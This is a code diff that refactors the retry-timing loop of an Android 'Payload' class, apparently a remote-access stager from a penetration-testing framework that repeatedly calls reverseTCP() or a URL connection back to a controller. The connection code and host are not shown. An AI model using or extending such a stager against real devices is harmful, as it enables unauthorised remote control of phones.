@@ -24,9 +24,10 @@ public class Payload {
     public static final String RETRY_TOTAL =    "TTTT                                ";
     public static final String RETRY_WAIT =     "SSSS                                ";
 
+    public static long retry_total;
+    public static long retry_wait;
+
     private static String[] parameters;
-    private static int retryTotal;
-    private static int retryWait;
 
     public static void start(Context context) {
         startInPath(context.getFilesDir().toString());
@@ -53,6 +54,8 @@ public class Payload {
             String path = currentDir.getAbsolutePath();
             parameters = new String[]{path};
         }
+        int retryTotal;
+        int retryWait;
         try {
             retryTotal = Integer.parseInt(RETRY_TOTAL.substring(4).trim());
             retryWait = Integer.parseInt(RETRY_WAIT.substring(4).trim());
@@ -60,10 +63,11 @@ public class Payload {
             return;
         }
 
-        long retryEnd = System.currentTimeMillis() + TimeUnit.SECONDS.toMillis(retryTotal);
-        long retryDelay = TimeUnit.SECONDS.toMillis(retryWait);
+        long payloadStart = System.currentTimeMillis();
+        retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
+        retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
 
-        while (retryEnd > System.currentTimeMillis()) {
+        while (System.currentTimeMillis() < payloadStart + retry_total) {
             try {
                 if (URL.substring(4).trim().length() == 0) {
                     reverseTCP();
@@ -75,7 +79,7 @@ public class Payload {
                 e.printStackTrace();
             }
             try {
-                Thread.sleep(retryDelay);
+                Thread.sleep(retry_wait);
             } catch (InterruptedException e) {
                 return;
             }
